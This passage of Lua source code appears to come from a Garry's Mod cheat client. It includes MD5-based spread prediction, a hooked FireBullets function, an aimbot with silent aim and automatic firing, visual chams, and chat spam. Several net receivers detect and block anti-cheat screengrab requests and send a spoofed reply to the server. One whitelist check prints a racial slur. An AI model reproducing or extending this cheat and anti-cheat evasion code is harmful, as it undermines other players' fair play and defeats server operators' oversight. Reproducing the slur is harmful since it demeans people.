    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_h, a, b, c, d, X[1], 4, NS.Const[37])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_h, d, a, b, c, X[4], 11, NS.Const[38])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_h, c, d, a, b, X[7], 16, NS.Const[39])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_h, b, c, d, a, X[10], 23, NS.Const[40])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_h, a, b, c, d, X[13], 4, NS.Const[41])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_h, d, a, b, c, X[0], 11, NS.Const[42])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_h, c, d, a, b, X[3], 16, NS.Const[43])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_h, b, c, d, a, X[6], 23, NS.Const[44])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_h, a, b, c, d, X[9], 4, NS.Const[45])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_h, d, a, b, c, X[12], 11, NS.Const[46])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_h, c, d, a, b, X[15], 16, NS.Const[47])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_h, b, c, d, a, X[2], 23, NS.Const[48])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_i, a, b, c, d, X[0], 6, NS.Const[49])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_i, d, a, b, c, X[7], 10, NS.Const[50])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_i ,c, d, a, b, X[14], 15, NS.Const[51])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_i, b, c, d, a, X[5], 21, NS.Const[52])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_i, a, b, c, d, X[12], 6, NS.Const[53])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_i, d, a, b, c, X[3], 10, NS.Const[54])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_i, c, d, a, b, X[10], 15, NS.Const[55])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_i, b, c, d, a, X[1], 21, NS.Const[56])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_i, a, b, c, d, X[8], 6, NS.Const[57])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_i, d, a, b, c, X[15], 10, NS.Const[58])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_i, c, d, a, b, X[6], 15, NS.Const[59])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_i, b, c, d, a, X[13], 21, NS.Const[60])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_i, a, b, c, d, X[4], 6, NS.Const[61])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_i, d, a, b, c, X[11], 10, NS.Const[62])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_i, c, d, a, b, X[2], 15, NS.Const[63])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_i, b, c, d, a, X[9], 21, NS.Const[64])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    return A + a, B + b, C + c, D + d
end
 
NS.Spread = {
    weapon_smg1 = {0.04362, 0.04362},
    weapon_ar2 = {0.02618, 0.02618},
    weapon_shotgun = {0.08716, 0.08716},
    weapon_pistol = {0.00873, 0.00873}
}
 
function NS.MD5.PseudoRandom(number)
    local a, b, c, d = NS.MD5.Fix(NS.Const[65]), NS.MD5.Fix(NS.Const[66]), NS.MD5.Fix(NS.Const[67]), NS.MD5.Fix(NS.Const[68])
    local m = {}
    for iter = 0, 15 do
        m[iter] = 0
    end
        m[0] = number
        m[1] = 128
        m[14] = 32
        a, b, c, d = NS.MD5.Transform(a, b, c, d, m)
    return bit.rshift(NS.MD5.Fix(b), 16) % 256
end


local R_ = debug.getregistry()
local R = table.Copy( R_ )
function R_.Entity.FireBullets(pEnt, bul)
    local wep = me:GetActiveWeapon() or nil
    if not IsValid(wep) then return end
    local class = wep:GetClass()
    if not bul.Spread or not IsValid(wep) or not me:Alive() then
        return R.Entity.FireBullets(pEnt, bul)
    end
    if not NS.Spread[class] or NS.Spread[class] ~= bul.Spread then
        NS.Spread[class] = bul.Spread
    end
    return R.Entity.FireBullets(pEnt, bul)
end
 
local function RemapClamped(val, A, B, C, D)
    if A == B then
        return val >= B and D or C
    end
    local cVal = (val - A) / (B - A)
    cVal = math.Clamp(cVal, 0.0, 1.0)
    return C + (D - C) * cVal
end

local function PredictSpread(cmd, ang)
    local wep = me:GetActiveWeapon()
    if not IsValid(wep) then return ang end
    local class = wep:GetClass()
    local cone = NS.Spread[class]
    if not cone then return ang end
    local seed = NS.MD5.PseudoRandom(cmd:CommandNumber())
    local x, y = NS.engineSpread[seed][1], NS.engineSpread[seed][2]
    local forward, right, up = ang:Forward(), ang:Right(), ang:Up()
    local RetVec = forward + (x * cone[1] * right * -1) + (y * cone[2] * up * -1)
    local spreadAngles =  RetVec:Angle()
    spreadAngles:Normalize()
    return spreadAngles
end

local function NormalizeAngle(ang)
    ang.x = math.NormalizeAngle( ang.x )
    ang.p = math.Clamp( ang.p, -89, 89 )
    return ang
end

local function FixMovement(cmd)
    local vec = Vector( cmd:GetForwardMove(), cmd:GetSideMove(), 0 )
    local vel = math.sqrt( vec.x*vec.x + vec.y*vec.y )
    local mang = vec:Angle()
    local yaw = cmd:GetViewAngles().y - angc.view.y + mang.y
    if (((cmd:GetViewAngles().p+90)%360) > 180) then
        yaw = 180 - yaw
    end
    yaw = ((yaw + 180)%360)-180
    cmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
    cmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function FixAngs(cmd)
    if not angc.view then angc.view = cmd:GetViewAngles( cmd ) end
    angc.view = angc.view + Angle( cmd:GetMouseY() * .023, cmd:GetMouseX() * -.023, 0 )
    angc.view = NormalizeAngle( angc.view )
    if cmd:CommandNumber() == 0 then cmd:SetViewAngles( angc.view )
        return
    end
end

local function GetPos(v)
    local bones = {}
    local eyes = v:LookupAttachment("eyes")
    if(!eyes) then return(v:LocalToWorld(v:OBBCenter())) end
    local pos = v:GetAttachment(eyes)
    if(!pos) then return(v:LocalToWorld(v:OBBCenter())) end
    if(Config["AimHitbox"] == 1) then
      return v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1"))
    elseif(Config["AimHitbox"] == 2) then
      return v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Neck1"))
    elseif(Config["AimHitbox"] == 3) then
      return v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Spine4"))
    elseif(Config["AimHitbox"] == 4) then
      return v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Spine"))
    elseif(Config["AimHitbox"] == 5) then
      return (v:LocalToWorld(v:OBBCenter()))
    elseif(Config["AimHitbox"] == 6) then
      return v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Pelvis"))
    else
      return (pos.Pos + Vector(1,0,1))
  end
end

local function Valid(v)
if(!v or !v:IsValid() or v:Health() < 1 or v:IsDormant() or v == me) then return false end
if(Config["Tplayers"]) then
  if v:IsPlayer() then
    if(!Config["Tteam"]) then
      if(v:Team() == me:Team()) then return false end
    end
    if(!Config["Tsteam"]) then
      if v:GetFriendStatus() == "friend" then return false end
    end
    if(!Config["Tbots"])  then
      if(v:IsBot()) then return false end
   end
   if(!Config["Tnoclip"])  then
      if v:GetMoveType() == MOVETYPE_NOCLIP then return false end
   end
   if (!Config["Tgodmode"]) and v:HasGodMode() then return false end
  end
end
    local trace = {
        mask = MASK_SHOT,
        endpos = GetPos(v),
        start = me:EyePos(),
        filter = {me, v},
    }
    return(util.TraceLine(trace).Fraction == 1)
end

local function GetAngleDiffrence(from, to)
    local ang, aim

    ang = from:Forward()
    aim = to:Forward()
    
    return math.deg( math.acos( aim:Dot(ang) / aim:LengthSqr() ) )
end

local function GetWep(ent)
local wep = ent:GetActiveWeapon()
    if ( IsValid(wep) ) then
        return wep:GetClass()
    else
        return false
    end
end
local function shouldFire(b)
    local wep = GetWep(me)
    local wepactive = me:GetActiveWeapon()
    local weps = {
        'weapon_physgun',
        'hands',
        'none',
        'pocket',
        'inventory',
        'weapon_physcannon',
        'weapon_vape*',
    }
    if me:Alive() and wep then
        for k, v in pairs( weps ) do
            if wep == v then return false end
        end
    end
    return true
end

local function Smoothing(ang)
    if (!Config["Smoothing"]) then return ang end
    local speed = RealFrameTime() / (Config["AimSmoothing"] / 25)
    local angl = LerpAngle(speed, me:EyeAngles(), ang)
    return Angle(angl.p, angl.y, 0)
end

local function Autoaim(cmd)
for k, v in pairs(player.GetAll()) do
 if Valid(v) then
 if friends[ v:SteamID() ] == true then continue end
   if(!Config["Tplayers"]) then
    if v:IsPlayer() then return end
  end
  if(!Config["Tnpc"]) then
    if v:IsNPC() then return end
  end
  if(v:GetClass() == "player" or string.StartWith(v:GetClass(), "npc_") or string.StartWith(v:GetClass(), "nz_zombie_*")) then
    if (!Config["UseKey"] or Config["AimKey"] == KEY_NONE) or ( Config["AimKey"] != 0 and ( ( Config["AimKey"] >= 107 and Config["AimKey"] <= 113 ) and input.IsMouseDown(Config["AimKey"]) ) or input.IsKeyDown(Config["AimKey"]) ) then
      local mev, vv, rft, tint = me:GetAbsVelocity(), v:GetAbsVelocity(), RealFrameTime(), engine.TickInterval()
      local ang = (GetPos(v) - me:EyePos() + vv * tint * rft - mev * tint):Angle()
      local curang = cmd:GetViewAngles()
      local angD = GetAngleDiffrence(curang, ang)
      local fov = math.abs(math.NormalizeAngle(angD))
      if fov < Config["AimFov"] then
       if Config["Silent"] then
          cmd:SetViewAngles( PredictSpread( cmd, ang ) ) 
       else
          cmd:SetViewAngles( Smoothing(PredictSpread( cmd, ang )) )
      end
      if Config["MayFire"] then
        cmd:SetButtons( bit.bor(cmd:GetButtons(), 1) )
            end
          end
        end
      end
    end
  end
end

local function normalizeAngle( ang )
    ang.x = math.NormalizeAngle( ang.x )
    ang.p = math.Clamp( ang.p, -89, 89 )
    return ang
end
local crouched = 0
local function fakeduck(cmd)
if Config["Fakeduck"] then
    if LocalPlayer():KeyDown(IN_DUCK) then
        if crouched <= 5 then
            cmd:SetButtons(cmd:GetButtons() + IN_DUCK)
        elseif crouched >= 25 then
            crouched = 0
        end
        crouched = crouched + 1
    end	
end
end

makeHook("PreDrawViewModel", function()
if Config["WeaponChams"] and Config["MiscToggle"] then
    local col2 = string.ToColor(Config.Col["WeaponChams"])
    render.SuppressEngineLighting(true)
    render.SetColorModulation((col2.r / 255), (col2.g / 255), (col2.b / 255))
    render.MaterialOverride(glow2)
    render.SetBlend(1)
end
end)
 
makeHook("PreDrawPlayerHands", function()
if Config["HandChams"] and Config["MiscToggle"] then
    local col1 = string.ToColor(Config.Col["HandChams"])
    render.SuppressEngineLighting(true)
    render.SetColorModulation((col1.r / 255), (col1.g / 255), (col1.b / 255))
    render.MaterialOverride(glow2)
    render.SetBlend(1)
end
end)

makeHook("PostDrawViewModel", function()
if Config["WeaponChams"] and Config["MiscToggle"] then
    render.SetColorModulation(1, 1, 1)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
    render.SuppressEngineLighting(false)
end
end)

makeHook("PostDrawPlayerHands", function()
if Config["HandChams"] and Config["MiscToggle"] then
    render.SetColorModulation(1, 1, 1)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
    render.SuppressEngineLighting(false)
end
end)

makeHook("PostDrawSkyBox", function()
    if Config["ClearSkybox"] and Config["MiscToggle"] then
        render.Clear(25,25,25, 255)
    end
    return true 
end)

local function chatspam()
    if Config["Chatspam"] and Config["MiscToggle"] then
        if Config["ChatOOC"] then
            RunConsoleCommand('say', '/ooc ' ..tostring(table.Random(methcheatchatspamlol)))
        else
            RunConsoleCommand('say', tostring(table.Random(methcheatchatspamlol)))
        end
    end
end

local function toggleui()
    if input.IsKeyDown( 72 ) and !toggle then
        if IsValid(colorWindow) then
            colorWindow:Remove()
        end
        if allahmenu then
            CloseFrame()
        else
            quoteforallah = tostring(table.Random(allahuakbar))
            allahui()
        end
    end
    toggle = input.IsKeyDown(72)
end

local function toggleuifriend()
    if input.IsKeyDown( 73 ) and !toggled then
        if friendderma then
            CloseFriendFrame()
        else
            FriendUI()
        end
    end
    toggled = input.IsKeyDown(73)
end

local function emergencyunload()
    if input.IsKeyDown( 75 ) then
		RunConsoleCommand('unload')
    end

end

local function checkID()
	if table.HasValue(goodID, LocalPlayer():SteamID()) then 
		print(' ')
	else
		print('you dont have this cheat, niggaaaaa') RunConsoleCommand('disconnect')
	end
end

local function cocknballs()
	if ( Config["AimKey"] != 0 and ( ( Config["AimKey"] >= 107 and Config["AimKey"] <= 113 ) and input.IsMouseDown(Config["AimKey"]) ) or input.IsKeyDown(Config["AimKey"]) ) and Config["Freezekey"] then
		RunConsoleCommand('cl_interp', tostring(Config["Lerptime"]/1000))
	else
		RunConsoleCommand('cl_interp', '0.0001')
	end
end


    table.getn = function()
            if Config["NotifyGrab"] then
                notification.AddLegacy("Screengrab Detected & Blocked", NOTIFY_ERROR, 5)
                surface.PlaySound( "buttons/bell1.wav" )
            end
            if Config["UnloadBlock"] then
                RunConsoleCommand('Unload')
            end
            return cock.copiedTbls._math.random(1,9999999999999)
    end


if NetReceiverExists("GimmeThatScreen_Request") then
	net_Receive("GimmeThatScreen_Request", function()
           if Config["NotifyGrab"] then
                notification.AddLegacy("Screengrab Detected & Blocked", NOTIFY_ERROR, 5)
                surface.PlaySound( "buttons/bell1.wav" )
            end
		    if Config["UnloadBlock"] then
                RunConsoleCommand('Unload')
			end
	end)
end



if NetReceiverExists("LeyScreenCap") then
	net_Receive("LeyScreenCap", function()
        	if Config["NotifyGrab"] then
                notification.AddLegacy("Screengrab Detected & Blocked", NOTIFY_ERROR, 5)
                surface.PlaySound( "buttons/bell1.wav" )
            end
            if Config["UnloadBlock"] then
                RunConsoleCommand('Unload')
            end
	end)
end


if NetReceiverExists("eP:Handeler") then
	net_Receive("eP:Handeler", function()
           if Config["NotifyGrab"] then
                notification.AddLegacy("Screengrab Detected & Blocked", NOTIFY_ERROR, 5)
                surface.PlaySound( "buttons/bell1.wav" )
            end
		    if Config["UnloadBlock"] then
                RunConsoleCommand('Unload')
            end
		net_Start("eP:Handeler")
			net_WriteBit(0)
			net_WriteUInt(1, 2)
			net_WriteUInt(1, 2)
			net_WriteString(BigStr)
		net_SendToServer()
	end)
end
local bloker = "SHUDPaint"
local function hudpaintblocker()
    if Config["HudpaintBlock"] then
        bloker = "SHUDPaint"
    else
        bloker = "HUDPaint"
    end
end

makeHook("Think", function()
    hudpaintblocker()
    chatspam()
    toggleui()
    toggleuifriend()
    emergencyunload()
    cocknballs()
    whatpos()
end)

makeHook("CreateMove", function(cmd)
    if Config["Aimbot"] then
      Autoaim(cmd)
    end
    if Config["Silent"] then
      FixMovement(cmd)
      FixAngs(cmd)
  end
  fakeduck(cmd)

end)


makeHook(bloker, function()
        coolers()
        otheresp()
end)
--checkID()